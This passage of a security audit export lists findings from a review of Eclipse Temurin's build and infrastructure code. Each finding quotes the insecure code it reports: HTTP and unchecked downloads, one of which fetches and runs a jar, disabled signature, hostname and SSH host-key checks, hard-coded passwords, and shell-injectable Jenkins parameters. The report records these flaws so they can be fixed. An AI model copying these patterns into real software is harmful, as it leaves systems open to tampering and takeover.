method. 18 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Docker Compose ports exposed on all interfaces ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The docker-compose.yml conguration le for the api.adoptium.net API server (which is used in development but not in production) species Docker ports using a ports conguration option of 27017:27017 for the MongoDB container and 8080:8080 for the front-end container (see gure 2.1). This means that these ports are accessible not just to other processes running on the same computer, but also from other computers on the same network. version : '3.6' services : mongodb : image : mongo:4.2 ports : - \"27017:27017\" frontend : depends_on : - mongodb image : \"adoptium-api\" build : context : . dockerfile : Dockerfile ports : - \"8080:8080\" environment : MONGODB_HOST : mongodb updater : depends_on : - mongodb image : \"adoptium-api\" command : \"java -jar /deployments/adoptium-api-v3-updater-runner.jar\" build : context : . dockerfile : Dockerfile environment : MONGODB_HOST : mongodb GITHUB_TOKEN : \"${GITHUB_TOKEN}\" GITHUB_APP_ID : \"${GITHUB_APP_ID}\" GITHUB_APP_PRIVATE_KEY : \"${GITHUB_APP_PRIVATE_KEY}\" 19 OSTIF Eclipse: Temurin Security Assessment GITHUB_APP_INSTALLATION_ID : \"${GITHUB_APP_INSTALLATION_ID}\" Figure 2.1: api.adoptium.net/docker-compose.yml Exploit Scenario A Temurin developer runs this docker-compose.yml le while on a public Wi-Fi network. An attacker who is on the same network connects to the MongoDB database running on the developers computer; this database is available on port 27017 without any password protection. The attacker modies an entry in the database containing a link to a binary le, which eventually causes the developer to unwittingly download and run a malicious le. Recommendations Short term, set these conguration values to 127.0.0.1:27017:27017 and 127.0.0.1:8080:8080 , instead of 27017:27017 and 8080:8080 . Long term, use static analysis rules to automatically detect ports that are exposed on all interfaces; the set of Semgrep rules provided alongside this report includes such a rule. 20 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Insecure installation of Xcode software ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The install-xcode.sh script uses unencrypted HTTP endpoints to download Xcode command-line tools and then installs them using the -allowUntrusted ag: if [[ \" $osx_vers \" -eq 7 ]] || [[ \" $osx_vers \" -eq 8 ]]; then if [[ \" $osx_vers \" -eq 7 ]]; then DMGURL =http://devimages.apple.com/downloads/xcode/command_line_tools_for_xcode_os_x_lion_april_ 2013.dmg fi if [[ \" $osx_vers \" -eq 8 ]]; then DMGURL =http://devimages.apple.com/downloads/xcode/command_line_tools_for_osx_mountain_lion_apri l_2014.dmg fi TOOLS =cltools.dmg curl \" $DMGURL \" -o \" $TOOLS \" TMPMOUNT = ` /usr/bin/mktemp -d /tmp/clitools.XXXX ` hdiutil attach \" $TOOLS \" -mountpoint \" $TMPMOUNT \" -nobrowse # The \"-allowUntrusted\" flag has been added to the installer # command to accomodate for now-expired certificates used # to sign the downloaded command line tools. installer -allowUntrusted -pkg \" $( find $TMPMOUNT -name '*.mpkg' ) \" -target / hdiutil detach \" $TMPMOUNT \" rm -rf \" $TMPMOUNT \" rm \" $TOOLS \" fi Figure 3.1: Untrusted installation of Xcode software ( infrastructure/ansible/playbooks/AdoptOpenJDK_ITW_Playbook/roles/Common/ scripts/install-xcode.sh:2344 ) Also, the OS X version check performs an imprecise comparison. This increases the likelihood that the untrusted installation will be performed on versions it is not intended for. The osx_vers variable considers only the system minor version rather than the minor and major version: 21 OSTIF Eclipse: Temurin Security Assessment osx_vers = $( sw_vers -productVersion | awk -F \".\" '{print $2}' ) Figure 3.2: The code checks only the system minor version. ( infrastructure/ansible/playbooks/AdoptOpenJDK_ITW_Playbook/roles/Common/ scripts/install-xcode.sh:2 ) This script is meant to perform the untrusted installation only if it is running on OS X version 10.7 or 10.8. Because the code checks only the minor version, this script will also perform the untrusted installation on macOS versions 11.7, 12.7, 13.7, and so on. Exploit Scenario An attacker is in a privileged network position relative to a system installing Xcode software and is able to actively intercept and modify the systems network trac. Because the software is downloaded over HTTP and its installation is untrusted, the attacker can modify the download in transit and replace the software with a malicious version. Recommendations Short term, have the script use HTTPS to download the software and ensure the integrity of the software by validating it against a known SHA-256 checksum. Long term, deprecate and remove support for OS X and macOS versions requiring an untrusted installation of the Xcode command-line tools. 22 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Insecure software downloads in Ansible playbooks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Ansible playbooks are used to congure various parts of the system infrastructure. These playbooks install software and generally congure systems to be in a consistent state. Many of the playbooks install software and package data in an insecure manner, using unencrypted channels such as HTTP (gure 4.1) or disabling certicate validation when performing the download (gure 4.2). The full list of such instances is provided in appendix C. - name : Add Azul Zulu GPG Package Signing Key for x86_64 apt_key : url : http://repos.azulsystems.com/RPM-GPG-KEY-azulsystems state : present when : - ansible_architecture == \"x86_64\" tags : [ patch_update , azul-key ] Figure 4.1: HTTP download ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/Ubuntu.yml:2531 ) - name : Enable EPEL release (not CentOS8) yum : name : epel-release state : installed update_cache : yes validate_certs : no when : ansible_distribution_major_version != \"8\" tags : patch_update Figure 4.2: Disabled SSL certicate validation ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/CentOS.yml:1522 ) Note that there are many more instances in which validate_certs is disabled. However, packages or downloads that specify a checksum alongside disabled validation are considered secure. This conguration was assumed to mean trust on rst use and that 23 OSTIF Eclipse: Temurin Security Assessment integrity of the software has been veried out of band and validated with a checksum. An example of the conguration is provided below: - name : Download expat get_url : url : https://github.com/libexpat/libexpat/releases/download/R_2_2_5/expat-2.2.5.tar.bz2 dest : /tmp/ mode : 0440 timeout : 25 validate_certs : no checksum : sha256:d9dc32efba7e74f788fcc4f212a43216fc37cf5f23f4c2339664d473353aedf6 Figure 4.3: SSL certicate validation disabled and checksum provided ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/openSUSE.yml:151158 ) Exploit Scenario An attacker is in a privileged network position relative to a system installing software using an Ansible playbook and is able to actively intercept and modify the systems network trac. Because the software is downloaded over HTTP, the attacker can modify the download in transit and replace the software with a malicious version. Recommendations Short term, change HTTP downloads to HTTPS, and enable SSL certicate validation. Long term, implement static analysis rules to automatically detect HTTP downloads and disabled SSL certicate validation in Ansible playbooks. 24 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Signature verication disabled during software installation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Software package signatures are veried upon installation to ensure their authenticity. GNU Privacy Guard (GPG) signatures are a common signing method. A number of Ansible playbooks disable GPG verication when installing packages. The following snippets show four locations where verication is disabled: - name : Sed change gpgcheck for gcc repo on x86_64 replace : path : /etc/zypp/repos.d/devel_gcc.repo regexp : 'gpgcheck=1' replace : \"gpgcheck=0\" when : - (ansible_distribution_major_version == \"12\" and ansible_architecture == \"x86_64\") tags : SUSE_gcc48 Figure 5.1: openSUSE playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Common /tasks/openSUSE.yml:2936 ) - name : Sed change gpgcheck for SLES12 on x86_64 command : sed 's/gpgcheck=1/gpgcheck=0/' -i /etc/zypp/repos.d/cuda.repo when : - cuda_installed.stat.islnk is not defined - ansible_architecture == \"x86_64\" - ansible_distribution == \"SLES\" or ansible_distribution == \"openSUSE\" - ansible_distribution_major_version == \"12\" tags : - nvidia_cuda_toolkit #TODO: rpm used in place of yum or rpm_key module - skip_ansible_lint 25 OSTIF Eclipse: Temurin Security Assessment Figure 5.2: NVIDIA playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/NVidia _Cuda_Toolkit/tasks/main.yml:105115 ) - name : Add Docker Repo x86-64/ppc64le yum_repository : name : docker description : docker repository baseurl : \"https://download.docker.com/linux/centos/{{ ansible_distribution_major_version }}/{{ ansible_architecture }}/stable\" enabled : true gpgcheck : false when : - ansible_architecture == \"x86_64\" or ansible_architecture == \"ppc64le\" - name : Add Docker repo for s390x on RHEL yum_repository : name : docker description : docker YUM repo s390x baseurl : https://download.docker.com/linux/rhel/{{ ansible_distribution_major_version }}/s390x/stable/ enabled : true gpgcheck : false when : - ansible_architecture == \"s390x\" Figure 5.3: Docker playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Docker /tasks/rhel.yml:1331 ) Exploit Scenario An attacker wants to upload a malicious package to one of the repositories. He is able to bypass the repository signing process or sign the package with an untrusted GPG key and successfully upload the package. The system performing the installation then installs the malicious package despite receiving an incorrect signature, or no signature at all. Recommendations Short term, import the correct package repository GPG keys, and enable GPG signature verication. Long term, implement static analysis rules to automatically detect disabled GPG signature verication in Ansible playbooks. 26 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Missing integrity check in Dragonwell Dockerle ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The Dragonwell Dockerle downloads and installs the Dragonwell software without verifying its integrity. A hashsum like SHA-256 should be used to ensure the integrity of the download and that the system is receiving the same data across multiple downloads. RUN \\ # Dragonewell 8 requires a dragonwell 8 BootJDK mkdir -p /opt/dragonwell; \\ wget https://github.com/alibaba/dragonwell8/releases/download/dragonwell- 8.4 . 4 _jdk8u262-g a/Alibaba_Dragonwell_8. 4.4 -GA_Linux_x64.tar.gz; \\ tar -xf Alibaba_Dragonwell_8. 4.4 -GA_Linux_x64.tar.gz -C /opt/; \\ mv /opt/jdk8u262-b10 /opt/dragonwell8 Figure 6.1: Download of the Dragonwell software ( ci-jenkins-pipelines/pipelines/build/dockerFiles/dragonwell.dockerfile:5 10 ) Note that the equivalent AArch64 download of the same software does verify the integrity with an MD5 hashsum: RUN \\ # Dragonewell 8 requires a dragonwell 8 BootJDK mkdir -p /opt/dragonwell8; \\ wget https://github.com/alibaba/dragonwell8/releases/download/dragonwell- 8.5 . 5 _jdk8u275-b 2/Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz; \\ test $(md5sum Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz | cut -d ' ' -f1) = \"ab80c4f638510de8c7211b7b7734f946\" || exit 1 ; \\ tar -xf Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz -C /opt/dragonwell8 --strip-components= 1 Figure 6.2: Download of the AArch64 Dragonwell software ( ci-jenkins-pipelines/pipelines/build/dockerFiles/dragonwell_aarch64.dock erfile:510 ) 27 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker is able to upload a malicious package to one of the repositories. The system performing the installation then installs the malicious package even though the underlying data within the package has changed. Recommendations Short term, add a SHA-256 hashsum check to ensure the integrity of the software. 28 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Hostname verication disabled on MongoDB client ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The MongoDB client used by the API server disables hostname verication when SSL is enabled. This could enable attackers to steal the database username and password through person-in-the-middle attacks. var settingsBuilder = MongoClientSettings.builder() .applyConnectionString(ConnectionString(connectionString)) val sslEnabled = System.getenv( \"MONGODB_SSL\" )?.toBoolean() if (sslEnabled == true ) { settingsBuilder = settingsBuilder.applyToSslSettings { it .enabled( true ). invalidHostNameAllowed( true ) } } client = KMongo.createClient(settingsBuilder.build()).coroutine database = client.getDatabase(dbName) Figure 7.1: Conguration code that disables hostname verication ( api.adoptium.net/adoptium-api-v3-persistence/src/main/kotlin/net/adoptiu m/api/v3/dataSources/persitence/mongo/MongoClient.kt#6774 ) Exploit Scenario The API server sends a request to the MongoDB database. A person-in-the-middle attacker impersonates the database, using his own SSL key. The API server then sends over its database username and password, encrypted using the attackers public key, rather than the databases public key. The attacker now knows the databases username and password and can tamper with its contents. Recommendations Short term, enable hostname verication by removing the call to invalidHostNameAllowed . 29 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. RHEL build image includes password ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The Red Hat Enterprise Linux (RHEL) build image takes a Red Hat username and password as a build argument. Docker build arguments are persisted in the resulting image, meaning that anyone who gains access to Temurins RHEL image will also have access to the Red Hat login information. FROM registry.access.redhat.com/rhel7 # This dockerfile should be built using: # docker build --no-cache -t rhel7_build_image -f ansible/docker/Dockerfile.RHEL7 --build-arg ROSIUSER=******* --build-arg ROSIPW=******* --build-arg git_sha=******* `pwd` ARG ROSIUSER ARG ROSIPW RUN sed -i 's/\\(def in_container():\\)/\\1\\n return False/g' /usr/lib64/python*/*-packages/rhsm/config.py RUN subscription-manager register --username= ${ ROSIUSER } --password= ${ ROSIPW } --auto-attach Figure 8.1: infrastructure/ansible/docker/Dockerfile.RHEL7#17 Recommendations Short term, use build secrets , rather than build arguments, to provide login information. 30 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Insecure downloads using wget command ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The wget command is used to download data over a network. The target codebases use wget in an insecure manner in a number of locations, using unencrypted channels such as HTTP or disabling certicate validation when performing the download. The following snippets show ve locations where wget is used in an insecure manner: RUN wget 'http://mirror.centos.org/centos/8-stream/BaseOS/x86_64/os/Packages/centos-gpg-keys- 8-3.el8.noarch.rpm' -O /tmp/gpgkey.rpm RUN rpm -i '/tmp/gpgkey.rpm' RUN wget 'http://mirror.centos.org/centos/8-stream/BaseOS/x86_64/os/Packages/centos-stream-re pos-8-3.el8.noarch.rpm' -O /tmp/centosrepos.rpm Figure 9.1: Unencrypted, HTTP download ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Docker Static/Dockerfiles/Dockerfile.ubi8:79 ) wget -O installer-vmlinuz http://http.us.debian.org/debian/dists/jessie/main/installer-armhf/current/images/ne tboot/vmlinuz wget -O installer-initrd.gz http://http.us.debian.org/debian/dists/jessie/main/installer-armhf/current/images/ne tboot/initrd.gz Figure 9.2: Unencrypted, HTTP download ( infrastructure/docs/Setup-QEMU-Images.md:166167 ) launcher = new CommandLauncher(Constants.SSH_COMMAND + \"${machineIPs[index]} \" + \"\\\" wget -q --no-check-certificate -O slave.jar ${JENKINS_URL}jnlpJars/slave.jar ; java -jar slave.jar\\\"\" ); Figure 9.3: Download with certicate validation disabled ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:32 ) 31 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker is in a privileged network position relative to a system downloading data using wget and is able to actively intercept and modify the systems network trac. Because the data is downloaded without SSL certicate verication, the attacker can modify the download in transit and replace the data with a malicious version. Recommendations Short term, change HTTP downloads to HTTPS, and enable SSL certicate validation. If it is not possible to change an HTTP download to HTTPS, such as in a package installation, then a verication key such as a GPG key should be included out of band and used to verify the package installation. In other words, a key can be hard-coded into an installation procedure and used to trust on rst use. Long term, implement static analysis rules to automatically detect HTTP downloads and disabled SSL certicate validation in wget commands. 32 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Hard-coded CA bundle keystore password ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The password used for the certicate authority (CA) bundle generated for the API service is hard-coded as changeit : keytool -import -alias mongodb -storepass changeit -keystore ./cacerts -file \" ${ MONGO_CERT_FILE } \" -noprompt JAVA_OPTS = \" $JAVA_OPTS -Djavax.net.ssl.trustStore=./cacerts -Djavax.net.ssl. trustStorePassword=changeit \" Figure 10.1: Hard-coded password ( api.adoptium.net/deploy/run.sh:2930 ) echo \"Processing certificate with alias: $ALIAS \" \" $KEYTOOL \" -noprompt \\ -import \\ -storetype JKS \\ -alias \" $ALIAS \" \\ -file \" $FILE \" \\ -keystore \"cacerts\" \\ -storepass \"changeit\" ... num_certs = $( \" $KEYTOOL \" -v -list -storepass changeit -keystore cacerts | grep -c \"Alias name:\" ) Figure 10.2: Hard-coded password ( temurin-build/security/mk-cacerts.sh:118125,143 ) This CA bundle is generated in a deterministic manner from publicly available Mozilla certicate data. This may seem to indicate that it need not be password-protected. However, the keystore password is used to verify the integrity and authenticity of the bundle. Without a condential password set, the integrity and authenticity of the data cannot be veried as the data moves from the build to runtime environment. Due to the lack of potentially attacker-controlled inputs into this functionality, this ndings severity is set to informational. 33 OSTIF Eclipse: Temurin Security Assessment Recommendations Short term, use a strong, randomly generated password to store this keystore data, and include this password at runtime to verify the authenticity of the CA bundle data. 34 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Hard-coded Vagrant VM password ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Vagrant VMs are used to execute build and test workloads in a CI environment. The VMs use a hard-coded password for authentication: session = winrm.Session( str (vmIP), auth=( 'vagrant' , 'vagrant' ) ) session.run_ps(cmd_str, sys.stdout, sys.stderr) Figure 11.1: Hard-coded password ( infrastructure/ansible/pbTestScripts/startScriptWin.py:2122 ) These VMs are run on an internal system without public access and are discarded upon completion of the workload. Due to the ephemeral nature of these VMs, the severity of this nding is set to informational. However, using a strong, random password may limit lateral movement in the event of an unrelated compromise and would be a benecial defense-in-depth mechanism. Recommendations Short term, use a strong, randomly generated password to authenticate Vagrant VMs at runtime. 35 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Missing integrity or authenticity check in jcov script download ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The jcov.sh script downloads ASM tools without verifying their integrity or authenticity: local tools = \"asm asm-tree asm-util\" local main_url = \"https://repository.ow2.org/nexus/content/repositories/releases/org/ow2/asm\" ASM_TITLE = \"Built against ' $tools ' tools in version ' $asm_version '\" ASM_URLS = \"\" ASM_JARS = \"\" ASM_PROPS = \"\" for tool in $tools ; do local tool_prop = \"`echo $tool |sed \" s/-/./g \"`.jar\" local tool_versioned = \" $tool - $asm_version .jar\" local tool_url = \" $main_url / $tool / $asm_version / $tool_versioned \" if [ \" $asm_manual \" == \"true\" ] ; then if [ ! -e $tool_versioned ] ; then wget $tool_url fi ... Figure 12.1: Download missing integrity or authenticity check ( ci-jenkins-pipelines/tools/code-tools/jcov.sh:6578 ) The integrity or authenticity should be veried using a hashsum like SHA-256 or a signature like a GPG signature. This would ensure that the system is receiving the same data across multiple downloads. This download does use HTTPS, so this issue is marked as low severity. Exploit Scenario An attacker is able to upload a malicious package to one of the repositories. The system performing the installation then installs the malicious package even though the underlying data within the package has changed. Recommendations Short term, add a SHA-256 hashsum check to ensure the integrity of the software, or a GPG verication to ensure the authenticity of the software. Both mechanisms are made available by the repository.ow2.org ASM repository. 36 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. SSH client disables host key verication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "SSH clients maintain a list of known-good hosts they have connected to before. Host key verication is then used to prevent person-in-the-middle attacks. There are a number of locations across the target repositories that disable SSH host key verication, such as when connecting to a Nagios instance: Reverse_Tunnel = \"ssh -o StrictHostKeyChecking=no -f -n -N -R $REMOTE_PORT :127.0.0.1: $LOCAL_PORT $USER_NAME @ $REMOTE_HOST -p $LOGIN_PORT -i $IDENTITY_KEY \" Figure 13.1: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_RemoteTunnel.sh:1821 ) Nagios_Login = ` su nagios -c \"ssh -o StrictHostKeyChecking=no $Sys_IPAddress uptime\"` Figure 13.2: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_Ansible_Config_tool.sh:170 ) command : ssh -o StrictHostKeyChecking=no root@{{ Nagios_Master_IP }} \"/usr/local/nagios/Nagios_Ansible_Config_tool/Nagios_Ansible_Config_tool.sh {{ ansible_distribution }} {{ ansible_architecture }} {{ inventory_hostname }} {{ ansible_host }} {{ provider }} {{ ansible_port }} \" Figure 13.3: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Nagios _Master_Config/tasks/main.yml:25 ) 37 OSTIF Eclipse: Temurin Security Assessment There are also a number of benign locations where SSH host key verication is disabled. These locations are considered benign because they are connecting to internal, short-lived, or local-only services. They are included here for completenesss sake: launcher = new SSHLauncher( machines[index], 22 , params.SSHCredentialId.isEmpty() ? Constants.SSH_CREDENTIAL_ID : params.SSHCredentialId, null , null , null , null , null , null , null , new NonVerifyingKeyVerificationStrategy() ); Figure 13.4: Groovy SSH launcher disabling host key verication ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:3843 ) sshpass -p 'password' ssh linux@localhost -p \" $PORTNO \" -o StrictHostKeyChecking =no 'uname -a' Figure 13.5: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/qemuPlaybookCheck.sh:273 ) ssh_args = \" $ssh_args -o StrictHostKeyChecking=no\" Figure 13.6: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/vagrantPlaybookCheck.sh:253 ) Exploit Scenario An attacker is in a privileged network position relative to a system initiating an SSH connection and is able to actively intercept and modify the systems network trac. Because SSH host key verication is disabled, the attacker can intercept SSH network trac and perform a person-in-the-middle attack. Recommendations Short term, in all locations where SSH host key verication is currently disabled, have the code gather the hosts SSH public key and add it out of band to the clients known_hosts le. Long term, implement static analysis rules to automatically detect when SSH host key verication is disabled. 38 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Compiler mitigations are not enabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The Temurin build does not have all modern compiler security mitigations enabled. This makes it easier for an attacker who nds a low-level vulnerability to exploit it and gain control over the process. Modern compilers support exploit mitigations such as the following:         Non-executable ag: Marks the programs data sections as non-executable PIE ag: Makes the program compiled as a position-independent executable, which is position-independent code for address space layout randomization (ASLR) Stack canaries: Used for buer overow detection RELRO: Used for data section hardening Source fortication: Used for buer overow detection and format string protection Stack clash protection: Used for the detection of clashes between a stack pointer and another memory region Control ow integrity (CFI) checks: Used to prevent control ow hijacking SafeStack: Used for stack overow protection Compilers enable a few of these mitigations by default. For more detail on these exploit mitigation technologies, refer to appendix D: Compiler Mitigations . In particular, the checksec tool reports that binaries produced by Temurin do not have stack canaries or source fortication enabled. Recommendations Short term, enable security mitigations for Temurin builds by using the compiler and linker ags described in appendix D: Compiler Mitigations . These ags can be added using the --with-extra-cflags and --with-extra-cxxflags arguments during conguration. 39 OSTIF Eclipse: Temurin Security Assessment While compilers often enable certain mitigations by default, if they are explicitly enabled, they will be used regardless of a compilers defaults. Long term, enable security mitigations for all binaries built by Temurin and add a scan for them into the test phase to ensure that certain options are always enabled. This will make it more dicult for an attacker to exploit any bugs found in the binaries. References      Airbus: Getting the maximum of your C compiler, for security Debian Hardening: Notes on Memory Corruption Mitigation Methods GCC Linux man page LD Linux man page OpenSSFs Compiler Options Hardening Guide for C and C++ 40 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Use of unpinned third-party workows ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Workows throughout the Temurin repositories directly use third-party workows. Most of them are pinned to commit hashes, but there are some exceptions, such as in ci-jenkins-pipelines/.github/workflows/labeler.yml : - uses : fuxingloh/multi-labeler@v2 with : github-token : \"${{secrets.GITHUB_TOKEN}}\" config-path : .github/regex_labeler.yml Figure 15.1: Use of third-party workow ( ci-jenkins-pipelines/.github/workflows/labeler.yml:1922 ) Git tags are malleable. This means that, while fuxingloh/multi-labeler is pinned to v2 , the upstream may silently change the reference pointed to by v2 . This can include malicious re-tags, in which case Temurins various dependent workows will silently update to the malicious workow. GitHubs security hardening guidelines for third-party actions encourage developers to pin third-party actions to a full-length commit hash. Generally excluded from this are ocial actions under the actions organization. The following are the aected workows:  temurin-build/.github/workflows/build-autotriage.yml  ci-jenkins-pipelines/.github/workflows/labeler.yml  infrastructure/.github/workflows/build_qemu.yml Exploit Scenario An attacker (or compromised maintainer) silently overwrites the v2 tag on fuxingloh/multi-labeler with a malicious version of the action, allowing the secrets.GITHUB_TOKEN value for the ci-jenkins-pipeline repository to be stolen. 41 OSTIF Eclipse: Temurin Security Assessment Recommendations Short term, replace the current version tags with full-length commit hashes corresponding to the revision that each workow is intended to use. 42 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Third-party dependencies used without signature or checksum verication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "In many places in the temurin-build repository, third-party dependencies are installed via https download without a signature or checksum check. The following is a (not necessarily exhaustive) list of the dependencies that are installed in this way:  In tooling/linux_repro_build_compare.sh :  https://ftp.gnu.org/gnu/autoconf/autoconf-2.69.tar.gz  https://archive.apache.org/dist/ant/binaries/apache-ant-${AN T_VERSION}-bin.zip  https://sourceforge.net/projects/ant-contrib/files/ant-contr ib/${ANT_CONTRIB_VERSION}/ant-contrib-${ANT_CONTRIB_VERSION} -bin.zip  In tooling/release_download_test.sh :  https://github.com/CycloneDX/cyclonedx-cli/releases/download /v0.25.0/\"${cyclonedx_tool}  In build-farm/platform-specific-configurations/linux.sh :  https://github.com/alibaba/dragonwell8/releases/download/dra gonwell-8.11.12_jdk8u332-ga/Alibaba_Dragonwell_8.11.12_x64_l inux.tar.gz  https://github.com/alibaba/dragonwell8/releases/download/dra gonwell-8.8.9_jdk8u302-ga/Alibaba_Dragonwell_8.8.9_aarch64_l inux.tar.gz  In .azure-devops/build/steps/windows/before.yml :  https://cygwin.com/setup-x86_64.exe  In .github/workflows/build.yml : 43 OSTIF Eclipse: Temurin Security Assessment  https://download.visualstudio.microsoft.com/download/pr/c5c7 5dfa-1b29-4419-80f8-bd39aed6bcd9/7ed8fa27575648163e07548ff56 67b55b95663a2323e2b2a5f87b16284e481e6/vs_Community.exe  https://download.visualstudio.microsoft.com/download/pr/6b65 5578-de8c-4862-ad77-65044ca714cf/f29399a618bd3a8d1dcc96d3494 53f686b6176590d904308402a6402543e310b/vs_Community.exe  In docker/buildDocker.sh :  https://raw.githubusercontent.com/eclipse-openj9/openj9/mast er/buildenv/docker/mkdocker.sh Recommendations Short term, add a checksum or signature check to these downloads, wherever possible. 44 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Code injection vulnerability in build-scripts pipeline jobs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Jenkins pipeline jobs can execute arbitrary shell script code with the sh step. User input may reach sh calls through parameters or congurations originating from web-based form input. This allows for code injection and arbitrary code execution. The following sh calls receive input from external sources: context.sh \"rm -rf target/ ${config.TARGET_OS}/${config.ARCHITECTURE}/${config.VARIANT} /\" Figure 17.1: TARGET_OS , ARCHITECTURE , and VARIANT input passed to sh ( ci-jenkins-pipelines/pipelines/build/common/build_base_file.groovy:898 ) context.sh( script: \"docker pull ${buildConfig.DOCKER_IMAGE} ${buildConfig.DOCKER_ARGS} \" ) ... context.sh( script: \"docker pull ${buildConfig.DOCKER_IMAGE} ${buildConfig.DOCKER_ARGS} \" ) ... dockerImageDigest = context.sh( script: \"docker inspect --format='{{.RepoDigests}}' ${buildConfig.DOCKER_IMAGE} \" , returnStdout:true ) Figure 17.2: DOCKER_IMAGE and DOCKER_ARGS input passed to sh ( ci-jenkins-pipelines/pipelines/build/common/openjdk_build_pipeline.groov y:1915,1922,1928 ) sh( \"curl -Os https://raw.githubusercontent.com/adoptium/aqa-tests/ ${params.aqaReference} /testenv/ ${propertyFile}\" ) Figure 17.3: AQA_REF input passed to sh ( ci-jenkins-pipelines/pipelines/build/openjdk_pipeline.groovy:35 ) If an attacker can inuence any of these parameters, then they can execute arbitrary code on the Jenkins machine running the given job. The 